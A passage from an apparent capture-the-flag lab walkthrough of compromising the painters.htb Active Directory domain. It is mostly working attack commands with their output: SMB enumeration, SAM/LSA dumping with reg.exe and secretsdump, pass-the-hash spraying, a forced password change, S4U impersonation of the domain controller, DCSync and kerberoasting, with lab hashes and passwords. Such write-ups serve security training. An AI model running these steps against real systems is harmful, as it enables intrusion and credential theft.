Host is up (0.0092s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Find hostname:

```bash
nxc smb 192.168.110.52 -u 'riley' -p 'P@ssw0rd' --shares

SMB         192.168.110.52  445    PNT-SVRSVC       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRSVC) (domain:painters.htb) (signing:False) (SMBv1:False)
SMB         192.168.110.52  445    PNT-SVRSVC       [+] painters.htb\riley:P@ssw0rd 
SMB         192.168.110.52  445    PNT-SVRSVC       [*] Enumerated shares
SMB         192.168.110.52  445    PNT-SVRSVC       Share           Permissions     Remark
SMB         192.168.110.52  445    PNT-SVRSVC       -----           -----------     ------
SMB         192.168.110.52  445    PNT-SVRSVC       ADMIN$                          Remote Admin
SMB         192.168.110.52  445    PNT-SVRSVC       C$                              Default share
SMB         192.168.110.52  445    PNT-SVRSVC       IPC$            READ            Remote IPC
```

The OS Windows Server 2022 Build 20348 x64.

From DC enumeration, we find web_svc’s credentials and we know it can winrm onto the machine:

```bash
evil-winrm -u web_svc -p '!QAZ1qaz' -i 192.168.110.52  
```

Let’s check our privileges:

```bash
whoami /priv
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2019.png)

It seems we have all the privileges… 

Let’s check whether we are administrator:

```bash
net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
James
PAINTERS\Domain Admins
PAINTERS\web_svc
The command completed successfully.
```

Let’s just extract SAM:

```bash
C:\WINDOWS\system32> reg.exe save hklm\sam C:\programdata\sam

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\programdata\system

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\programdata\security

The operation completed successfully.
```

Now let’s transfer it back:

```bash
#on our evil-winrm
download sam
download system 
download security
```

Now we can use secretsump

```bash
impacket-secretsdump -sam sam -security security -system system LOCAL

[*] Target system bootKey: 0xb131ea5c8206a94e3d32119d035961a9
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6ee87fa6593a4798fe651f5f5a4e663e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
James:1001:aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea:::
[*] Dumping cached domain logon information (domain/username:hash)
PAINTERS.HTB/Administrator:$DCC2$10240#Administrator#4f3d8c09f46360e84463d125c240c554: (2024-12-11 15:06:55+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:9c2295062db39652dd63b214344ce839af0ab487e64efc62923556fd6515e24f383f0f9a34006bae1f108446483b2e8c54a2d0bd08388b0e47dc12ad75a1859c45c917072bb683477e379108ff3131bcb52a4d4a2046c6c6f6252945e4b4e3c465a33a379854b4771e7cec30db10df8990bb0867c826c50d8d0646d4f817d70becbf98058e81d6a5b0f606263ea3c6495ff553bef55ee6fe109d03e5237ad0061f9ed7f0694d5c9be2a87379b82491871df259d251ff8a114d76961009551f53a5abaa1d51d7aa1d06d6e730a1a14797d33f71c3690eea3a00a09711f2053872d9dc815e3de06808e6b681c737cc9e33
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:c206d294c947cecc0e60955004ff96c5
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6a28296d276ce0627958e99cfbcab0b54ff64355
dpapi_userkey:0xaf502a3258e233f29ce3ca24257f5877965bb87d
[*] NL$KM 
 0000   48 6D D8 24 3E D2 25 7B  96 58 D1 98 1B 7A E3 57   Hm.$>.%{.X...z.W
 0010   79 5B C9 17 D2 E7 E7 1A  F9 48 B4 9F D8 6D 1E A8   y[.......H...m..
 0020   F8 9B 47 1C B9 E3 B2 E1  CE FC 2C 92 48 01 39 25   ..G.......,.H.9%
 0030   A3 AA D4 45 A3 F4 A5 A8  4B 9B DE 1F 86 A7 5B B7   ...E....K.....[.
NL$KM:486dd8243ed2257b9658d1981b7ae357795bc917d2e7e71af948b49fd86d1ea8f89b471cb9e3b2e1cefc2c9248013925a3aad445a3f4a5a84b9bde1f86a75bb7
[*] Cleaning up... 
```

Let’s upload snaffler and attempt to execute:

```bash
.\Snaffler.exe -d painters.htb -s -v data
```

There seem to be a block on exe files. 

```bash
nxc smb 192.168.110.55 -u PNT-SVRSVC$ -H c206d294c947cecc0e60955004ff96c5 --shares

nxc smb 192.168.110.52 -u Administrator -H 6ee87fa6593a4798fe651f5f5a4e663e --local-auth

SMB         192.168.110.52  445    PNT-SVRSVC       [-] PNT-SVRSVC\Administrator:6ee87fa6593a4798fe651f5f5a4e663e STATUS_ACCOUNT_DISABLED

nxc smb 192.168.110.52 -u James -H 8af1903d3c80d3552a84b6ba296db2ea --local-auth

SMB         192.168.110.52  445    PNT-SVRSVC       [-] PNT-SVRSVC\James:8af1903d3c80d3552a84b6ba296db2ea STATUS_PASSWORD_EXPIRED 

```

Let’s password spray with our NTLM, see if it’s reused:

```bash
nxc smb --local-auth 192.168.110.0/23 -u administrator -H 6ee87fa6593a4798fe651f5f5a4e663e

SMB         192.168.110.53  445    PNT-SVRBPA       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRBPA) (domain:PNT-SVRBPA) (signing:False) (SMBv1:False)
SMB         192.168.110.55  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:DC) (signing:True) (SMBv1:False)
SMB         192.168.110.52  445    PNT-SVRSVC       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRSVC) (domain:PNT-SVRSVC) (signing:False) (SMBv1:False)
SMB         192.168.110.53  445    PNT-SVRBPA       [-] PNT-SVRBPA\administrator:6ee87fa6593a4798fe651f5f5a4e663e STATUS_LOGON_FAILURE
SMB         192.168.110.55  445    DC               [-] DC\administrator:6ee87fa6593a4798fe651f5f5a4e663e STATUS_LOGON_FAILURE
SMB         192.168.110.52  445    PNT-SVRSVC       [-] PNT-SVRSVC\administrator:6ee87fa6593a4798fe651f5f5a4e663e STATUS_ACCOUNT_DISABLED
Running nxc against 512 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```

Let’s try James:

```bash
nxc smb --local-auth 192.168.110.0/23 -u James -H 8af1903d3c80d3552a84b6ba296db2ea

<SNIP>
SMB         192.168.110.53  445    PNT-SVRBPA       [+] PNT-SVRBPA\James:8af1903d3c80d3552a84b6ba296db2ea (Pwn3d!)

```

## 192.168.110.53 PNT-SVRBPA

```bash
Nmap scan report for 192.168.110.53
Host is up (0.0095s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3s
| smb2-time:
|   date: 2025-11-13T10:51:15
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: PNT-SVRBPA, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:c4:5c (VMware)
```

Find hostname:

```bash
nxc smb 192.168.110.53 -u 'riley' -p 'P@ssw0rd'  --shares

SMB         192.168.110.53  445    PNT-SVRBPA       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRBPA) (domain:painters.htb) (signing:False) (SMBv1:False)
SMB         192.168.110.53  445    PNT-SVRBPA       [+] painters.htb\riley:P@ssw0rd 
SMB         192.168.110.53  445    PNT-SVRBPA       [*] Enumerated shares
SMB         192.168.110.53  445    PNT-SVRBPA       Share           Permissions     Remark
SMB         192.168.110.53  445    PNT-SVRBPA       -----           -----------     ------
SMB         192.168.110.53  445    PNT-SVRBPA       ADMIN$                          Remote Admin
SMB         192.168.110.53  445    PNT-SVRBPA       C$                              Default share
SMB         192.168.110.53  445    PNT-SVRBPA       IPC$            READ            Remote IPC

```

Looking at bloodhound, we have forceChangePassword on blake:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2020.png)

From enumerating SVRSVC, we have james’ NTLM, and we know from our password spray the password is reused. Let’s winrm on:

```bash
evil-winrm -u James -H 8af1903d3c80d3552a84b6ba296db2ea -i 192.168.110.53
```

Again, we have all privileges:

```bash
whoami /priv
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2021.png)

Checking administrators on the machine:

```bash
net localgroup administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
James
PAINTERS\Blake
PAINTERS\Domain Admins
The command completed successfully.

```

Let’s get sam:

```bash
nxc smb 192.168.110.53 -u James -H 8af1903d3c80d3552a84b6ba296db2ea --local-auth --sam

SMB         192.168.110.53  445    PNT-SVRBPA       Administrator:500:aad3b435b51404eeaad3b435b51404ee:23ea5ff648e7ec7dcd1bfef8e9434099:::
SMB         192.168.110.53  445    PNT-SVRBPA       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.110.53  445    PNT-SVRBPA       DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.110.53  445    PNT-SVRBPA       WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.110.53  445    PNT-SVRBPA       James:1001:aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea:::
SMB         192.168.110.53  445    PNT-SVRBPA       Blake:1002:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         192.168.110.53  445    PNT-SVRBPA       tffd:1003:aad3b435b51404eeaad3b435b51404ee:dd96fcc40591986b11db4b4314a93602:::
```

```bash
nxc smb 192.168.110.53 -u James -H 8af1903d3c80d3552a84b6ba296db2ea --local-auth --lsa

SMB         192.168.110.53  445    PNT-SVRBPA       PAINTERS.HTB/Administrator:$DCC2$10240#Administrator#4f3d8c09f46360e84463d125c240c554: (2024-12-11 15:23:25)
SMB         192.168.110.53  445    PNT-SVRBPA       PAINTERS\PNT-SVRBPA$:aes256-cts-hmac-sha1-96:09f22fb6cd45a7a633854dcb861371f7af81676d336121d383c35328c127bee4
SMB         192.168.110.53  445    PNT-SVRBPA       PAINTERS\PNT-SVRBPA$:aes128-cts-hmac-sha1-96:a064d5c19ffd7dc845c31cbc9bbcc85d
SMB         192.168.110.53  445    PNT-SVRBPA       PAINTERS\PNT-SVRBPA$:des-cbc-md5:735b3e23014a0db6
SMB         192.168.110.53  445    PNT-SVRBPA       PAINTERS\PNT-SVRBPA$:plain_password_hex:5d3cc87cf260661f1a039bd408f1d6aed120a007392e50ed63687ba65da1bd181dac3f7a80050ab01f7550231e74c3227e109fa1ab0e6fd81191dcdd7ff44df3ba10ec0ccf98665fe5865851ea0cded365209813931eb3f2fefd39ba12c9e87a83cba190b637a70018d749d8ecfc60c616564d5d997821b19c8798ac9e55dd9f63579f966018ae78a1c037278e17cb221afd2b8e8f68ac4674b1c9938d19205d0edefdda8d7fc228a115d3a84ec36ef3e20ca69ed66b9868a65a5f3262fd21d14c8a2f0279fcf87336292931f0fe64a2f669cedb0b3a7b0362a1a91fe0503860987d37bba23c92479780c8b08c9b97fa
SMB         192.168.110.53  445    PNT-SVRBPA       PAINTERS\PNT-SVRBPA$:aad3b435b51404eeaad3b435b51404ee:2dfcebbe9f5f4cb3bf98032887b3d7b6:::
SMB         192.168.110.53  445    PNT-SVRBPA       dpapi_machinekey:0xad498beaf701b95a8dd1964550c63155f72f7a36
dpapi_userkey:0xf846daf70f1294258b24a9a586eafbf004c5cc0b
```

Let’s test our blake’s NTLM:

```bash
nxc smb dc.painters.htb -u blake -H 2b576acbe6bcfda7294d6bd18041b8fe

SMB         192.168.110.55  445    DC               [-] painters.htb\blake:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE
```

Nope. But doesn’t matter since we have ForceChangePassword. Let’s check blake’s privileges:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2022.png)

This mean we can impersonate any user in the DC, as long as they are not part of Protected Users. We can impersonate DC machine, then DCSync.

First let’s change blake’s password:

```bash
bloodyAD -u PNT-SVRBPA$ -p :2dfcebbe9f5f4cb3bf98032887b3d7b6 -d painters.htb --host dc.painters.htb set password blake 'Pass123!'

[+] Password changed successfully!
```

```bash
impacket-getST -spn 'cifs/dc.painters.htb' -impersonate 'dc' 'painters.htb/blake:Pass123!' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc@cifs_dc.painters.htb@PAINTERS.HTB.ccache

```

Now let’s export ticket:

```bash
export KRB5CCNAME='dc@cifs_dc.painters.htb@PAINTERS.HTB.ccache'
```

Now let’s get the krb5.conf:

```bash
nxc smb dc.painters.htb -u blake -p 'Pass123!' --generate-krb5-file painters.krb5
```

Now copy it over:

```bash
sudo cp painters.krb5 /etc/krb5.conf
```

Now let’s try DCSync:

```bash
impacket-secretsdump -k dc.painters.htb 

Administrator:500:aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53:::

<SNIP>
[*] ClearText passwords grabbed
painters.htb\Matt:CLEARTEXT:L1f30f4Spr1ngCh1ck3n!

```

Success. 

Let’s verify:

```bash
nxc smb dc.painters.htb -u Administrator -H 58a478135a93ac3bf058a5ea0e8fdb71 --shares

SMB         192.168.110.55  445    DC               [+] painters.htb\Administrator:58a478135a93ac3bf058a5ea0e8fdb71 (Pwn3d!)
SMB         192.168.110.55  445    DC               [*] Enumerated shares
SMB         192.168.110.55  445    DC               Share           Permissions     Remark
SMB         192.168.110.55  445    DC               -----           -----------     ------
SMB         192.168.110.55  445    DC               ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.110.55  445    DC               C$              READ,WRITE      Default share
SMB         192.168.110.55  445    DC               IPC$            READ            Remote IPC
SMB         192.168.110.55  445    DC               NETLOGON        READ,WRITE      Logon server share 
SMB         192.168.110.55  445    DC               SYSVOL          READ,WRITE      Logon server share 
```

Let’s check matt’s password back in mail as well. Follow mail for priv esc.

## 192.168.110.54 PNT-SVRPSB

```bash
Nmap scan report for 192.168.110.54
Host is up (0.0015s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Find hostname:

```bash
nxc winrm 192.168.110.54 -u 'riley' -p 'P@ssw0rd'         

WINRM       192.168.110.54  5985   PNT-SVRPSB       [*] Windows Server 2022 Build 20348 (name:PNT-SVRPSB) (domain:painters.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.110.54  5985   PNT-SVRPSB       [-] painters.htb\riley:P@ssw0rd

```

We got domain admin on DC. Let’s login:

```bash
evil-winrm -u Administrator -H 58a478135a93ac3bf058a5ea0e8fdb71 -i 192.168.110.54
```

Success.

![image.png]({{ site.baseurl }}/assets/zephyr/image%2023.png)

Let’s also dump sam and lsa:

```bash
C:\WINDOWS\system32> reg.exe save hklm\sam C:\programdata\sam

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\programdata\system

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\programdata\security

The operation completed successfully.
```

Now let’s transfer it back:

```bash
#on our evil-winrm
download sam
download system 
download security
```

Now we can use secretsump

```bash
impacket-secretsdump -sam sam -security security -system system LOCAL

[*] Target system bootKey: 0xe84cfc715ea5d48c94b35796175e802a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ea794e50c1ac708c1db3aa025aeb5ea:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
PAINTERS.HTB/blake:$DCC2$10240#blake#208c8e5baa521a823aff62fafef30cfc: (2023-02-27 13:07:57+00:00)
PAINTERS.HTB/Administrator:$DCC2$10240#Administrator#4f3d8c09f46360e84463d125c240c554: (2024-12-11 15:15:26+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:57979742bad762e01f40005c6919cdd6229188a6d6c0ee28791d778d29b054f7771cfca78db3482d6b15dfa2a57b43d23436019a0c25115e433b099a5f2c724b56b04f29a2f8b8993541d1f19b863884bee36c5be01c069d193e72621d9afe0ffcd4a17da90028a61cad9e0cb1a0699b6fd4e3596d3514dc136d3c82cb67c9afbb759e035e24925272c4f32a9affc6cdfde394a73e4c2ec683e2af6c4db364a11c8c5a09136490e7f94b93fb0e4c8a7b0a9db42f761435d0519ec3cfba69ef72d59c9d86d107efb06a1444ffc6bb1807b6c8727c3501f21b0698a50582a37dfcb707500e2ee1bb799e1d412707c035b2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7fc6b6b4b44a96617b5829a888b5a85a
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xeea0ab26089b4c01128ff703571d5f50ef86f728
dpapi_userkey:0x762a420566ee06d418442baba8d351d242b38442
[*] NL$KM 
 0000   48 6D D8 24 3E D2 25 7B  96 58 D1 98 1B 7A E3 57   Hm.$>.%{.X...z.W
 0010   79 5B C9 17 D2 E7 E7 1A  F9 48 B4 9F D8 6D 1E A8   y[.......H...m..
 0020   F8 9B 47 1C B9 E3 B2 E1  CE FC 2C 92 48 01 39 25   ..G.......,.H.9%
 0030   A3 AA D4 45 A3 F4 A5 A8  4B 9B DE 1F 86 A7 5B B7   ...E....K.....[.
NL$KM:486dd8243ed2257b9658d1981b7ae357795bc917d2e7e71af948b49fd86d1ea8f89b471cb9e3b2e1cefc2c9248013925a3aad445a3f4a5a84b9bde1f86a75bb7
[*] Cleaning up...
```

Nothing new. 

## 192.168.110.55 DC.painters.htb

```bash
Nmap scan report for 192.168.110.55
Host is up (0.024s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-13 10:51:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: painters.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: painters.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Let’s add the internal IP and DC name to our /etc/hosts file. Since we are enumerating internal AD, we comment out the previous entry of the external IP. 

```bash
192.168.110.55 dc.painters.htb painters.htb
```

Find hostname:

```bash
nxc smb 192.168.110.55 -u 'riley' -p 'P@ssw0rd' --shares        

SMB         192.168.110.55  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:painters.htb) (signing:True) (SMBv1:False)
SMB         192.168.110.55  445    DC               [+] painters.htb\riley:P@ssw0rd 
SMB         192.168.110.55  445    DC               [*] Enumerated shares
SMB         192.168.110.55  445    DC               Share           Permissions     Remark
SMB         192.168.110.55  445    DC               -----           -----------     ------
SMB         192.168.110.55  445    DC               ADMIN$                          Remote Admin
SMB         192.168.110.55  445    DC               C$                              Default share
SMB         192.168.110.55  445    DC               IPC$            READ            Remote IPC
SMB         192.168.110.55  445    DC               NETLOGON        READ            Logon server share 
SMB         192.168.110.55  445    DC               SYSVOL          READ            Logon server share 
```

Let’s enumerate NETLOGON, it might contain startup scripts:

```bash
nxc smb 192.168.110.55 -u 'riley' -p 'P@ssw0rd' --spider NETLOGON --regex .
```

Nothing. 

Let’s map out the whole AD with rusthound:

```bash
rusthound-ce -u 'riley' -p 'P@ssw0rd' -d painters.htb
```

Let’s search up our privileges:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2024.png)

We have none. 

Let’s also get a full users lists:

```bash
nxc smb 192.168.110.55 -u 'riley' -p 'P@ssw0rd' --users

SMB         192.168.110.55  445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                    
SMB         192.168.110.55  445    DC               Administrator                 2022-05-17 14:08:35 0       Built-in account for administering the computer/domain
SMB         192.168.110.55  445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         192.168.110.55  445    DC               krbtgt                        2022-03-06 16:18:53 0       Key Distribution Center Service Account
SMB         192.168.110.55  445    DC               riley                         2023-05-26 07:22:35 0        
SMB         192.168.110.55  445    DC               blake                         2022-03-06 19:43:06 0        
SMB         192.168.110.55  445    DC               gavin                         2022-03-06 19:45:07 0        
SMB         192.168.110.55  445    DC               daniel                        2022-03-06 19:45:34 0        
SMB         192.168.110.55  445    DC               tom                           2022-03-06 19:45:49 0        
SMB         192.168.110.55  445    DC               web_svc                       2023-05-24 06:50:47 0        
SMB         192.168.110.55  445    DC               Matt                          2022-10-19 21:23:30 0       Administrator of Web Server
```

From this, we see that user matt is admin for webserver. Let’s format it and put it in valid_users.txt:

```bash
awk '{print $5}' users.txt > valid_users.txt
```

Let’s also find kerberoastable users:

```bash
nxc ldap dc.painters.htb -u 'riley' -p 'P@ssw0rd' --kerberoasting kerberoasting.out

LDAP        192.168.110.55  389    DC               [*] sAMAccountName: blake, memberOf: [], pwdLastSet: 2022-03-06 14:43:06.695009, lastLogon: 2023-02-27 08:07:57.364107
LDAP        192.168.110.55  389    DC               $krb5tgs$23$*blake$PAINTERS.HTB$painters.htb\blake*$63220c19f01c1f0b92b53c51d4a2f663$67a15cc5569b7c40df42c8f402c3575729728e8050ec665382b683e00db7e2300510b48abb75561d284a44a2fb8b45298fdf17690eec507bc2f7a1ccf73ff3cb159f08479b7dd58709c46202a7a8a91e7742336a98441d19f2ffedc3dd5c01b78a91f55620bbd39f8cea6ebafe9bdb25cb491a405899ce3a4d3119f5f1391a83635501679340fd9ac2ec4a846d4acbbe21bfb47742bea646bc1e3f9d86a61d6352457fb23ab6eef62aa2910c28271df9d375f59b903aae7b8e0fc1d94dd93549de4922f81ba5c0386592d26c4862d319b719249925609278d95c67c3557cccb7baa97e20bed46254af1a04941c2583945186cc995b7331b2dd12c73d5d3bbea0fd9ac0570016ff087a49f99cf1e5d2bcd1d4df82048bd9fdc7689eb625081e38a511d586f88b8b9af8b013229c6989a06efa4c70fc491badb5e314776818f1bed0de0a7c618954a082645c3f2a619c3630f2262f5a278c8957f49693c36afc87295bb9cafffbc10d5230ada955716d24714ab9015344154ffe60ed8eb1db7de223da62f1f37b8f2f5dc2bbcb9c3141f8c7e5efd6b17adfa73e4d545f2925da97372766c1dd99c0f77c27346bea8d57ce4bf9b652e0eef6fd1a415694efdd668021e5f09aed6c7cba60f53f55d12515954f725ade75534b3912cbbcdfe95df3f6ee67ca0b25fe7a1741101679aff9f32627497ee3222e98cec51c5782cdb9a1ca44acaf4a4680a90dfbdcce67afea361d7563d8406d2d50cd220817defdca9a32740626710c6dba890866e7fa120d1e06651cd486b065beac078c2c395c382e4af477d07181576dd8917b7614d8f9b646cff7f79e2ca83e77a4305f24cf2af81fa057e9dc5c62cde9806d1bc217f03ca8dc1f9eaa1972337b03fe673a395e3ab609ca96321d105e4be6501b1fd5afaf663137aa4c6b5251e726a80487ff624a1316f5c132ff2e0041ae74c6494162449bb6302ac006b0c17bcfc5b0b755fc102413c3b6e623f9b86b8f3a2723ad8a36e5a3f4bc8a4840a742f84b5aac42a1a24062d8f1b00d5c301f17b87c09bfccd9fcfe18d5630b65ac639c4e202e1c45ad2f07b0f7707d72c9041acebfcc0d36d17da215cd705c615dea912a90a70fbbd694e1fd563408d280338add7df772fb1254724092e58d480c767114046439a7c3295f3de9636ecb06e3b729344a4d5f49988ea1b6bfe4236b1e224910de76ebdde33fe43a2d253d659620c142d04806d24416a1e111da9304c669c97b575a784d35d348caa702d2e23f6299476142c86df0116901edff01319d106224c3430846fe3c738f1884b5180f8409c9b7fe31fff22cde3c70d8e25d93c1b1613ecdf551094e65d6ca3830afedf0497e4669cc5490273fbd19cf96a5b745bb4441c5e8f0e08e80647b5ccfea8bf54adb1c3bd199486e99074bbcfe0f45dcdca85f065447c31f774bf77e64af3d47c1
LDAP        192.168.110.55  389    DC               [*] sAMAccountName: web_svc, memberOf: [], pwdLastSet: 2023-05-24 02:50:47.043365, lastLogon: 2022-03-09 14:43:24.961963
LDAP        192.168.110.55  389    DC               $krb5tgs$23$*web_svc$PAINTERS.HTB$painters.htb\web_svc*$870cfaeafc5bfe3772d8b59df8b375f2$be7a4514c36dc90afde42e54919132423e588ee169300bb7f19c4e53c25ddc3e0bc4d8d02a2198af342568aebd49bdb3dec12a51d604de10546ca6dce3b0b86ae85a9527160f0fe7601521ad460791314069395be1e564fd573eb9c71507341979e50d2401dcb6d04487fbe720508bfdf96ed89efa0d7a807f290a43f50b3bfb342f44fd72a4d13db984236b48459ae6e90fe3f1da26f0197bd4a9084bb888123587e4a80b6f451d9b0d141c72c8b4a72b5fb9de4493fdf2ade96b46a66345cfbfcc4d62ad061a3ff5c17351d2d654e565a20731308bf943fab6afdd5ede282b1404df785588299c989e6da1fb8aed30d853e695cb183c2654226e4769235983205b24f334cf9eebb05199d4ce2ea28cc22fc2524c9245797541e1b80afb80d21a21c7a9c4ce754481d9bc7e1d42ff50254a93c334be33503bf8919575d65b1d5900313303c3bdb3268db25fe3a0a5ef34445f8c0a6bb5f8e99b844c1707a859f82dd54ed15c56a9a0942b1fad66b77bd92b210c3a2fd53032bca5cb20a9e4a0caf74e8032b30b47fc8ae280e168715688bac0ada1a94dfddf94e3ec1b2da878f3ad502969654d846a5293fbff91861391b7b6cd4fa04c71b72c9a9340ebece0dc72c8920b6aac308a306386448f61c0f3e49f23655fca53594097c083a936d04f58278bb1dc4b780761c3a85879b2c31abee69edc958f5a33578ac54eb4f43db176a01f347f83b0b7a86f11ebdfdfb3ef2050b741fa781fdb08ff46ef6a8cd3346951408745bb3622a0f5d353882618625d1eb2c2cb539e99f01874a374cb357c7f58a95f93dc094282b28ab572535de96509f0335ff0d70252d09051b2bdc394a35367fbc6d98caa486a2b18424a457d7ad87948bdf01335742e6604c21e0b4c701317ee5c711808d86961409082648ee70463391dd33be512f4426ad057a0d242555d949c2d4acc9ace932a8c1958ae180683698ce6af7c0c48ae0beeb0ba4d4edae5a7daa54a0633d2492042554db154e7826debe9c4d0c81f637e3729db7b52f4944f9b6ae08b9b1ad7fd75c92afdd4a42aefb4e77288b57b1b13fc5e7ddae584b18751487c1a7030779e49398437a4cad2fe9c510d4dcfc4c2a4cc929db2ff13a1d9f70fb3e1691dc1b7fce8042c7460ec319b31a1ac96f508202c30cf634a965e918a7cfc6be868c01ea44c28166e6f7c54baa8c6807760c8f3ded1c99ac357c9e6acd9ec2ba3243116f0040235c26c3e563dcf8f4faffed30de39651c2759067f7ae497a0713be37c6620089cd372aa769e3c6553e9b3aa131490c8267a70d8365a8e5de8f14e3f0f6871c9dc7149f96e16984c7063add48352e342bc464345e4701148323896474189c50ddf02b7a6572a6d79951dab52e7b4317d628b8757cb425ae9ac88fe7f532aa3aee82f1f1bbfdf3c90c047f426221c43f60e477af18eb25d0f5dd2c

```

We find two users. Let’s put the hashes into a file and crack it with hashcat:

```bash
.\hashcat.exe -m 13100 ..\hashes.txt ..\rockyou.txt
```

We cracked one:

```bash
web_svc:!QAZ1qaz
```

Let’s verify:

```bash
nxc smb dc.painters.htb -u web_svc -p '!QAZ1qaz' --shares

SMB         192.168.110.55  445    DC               [+] painters.htb\web_svc:!QAZ1qaz 

SMB         192.168.110.55  445    DC               Share           Permissions     Remark
SMB         192.168.110.55  445    DC               -----           -----------     ------
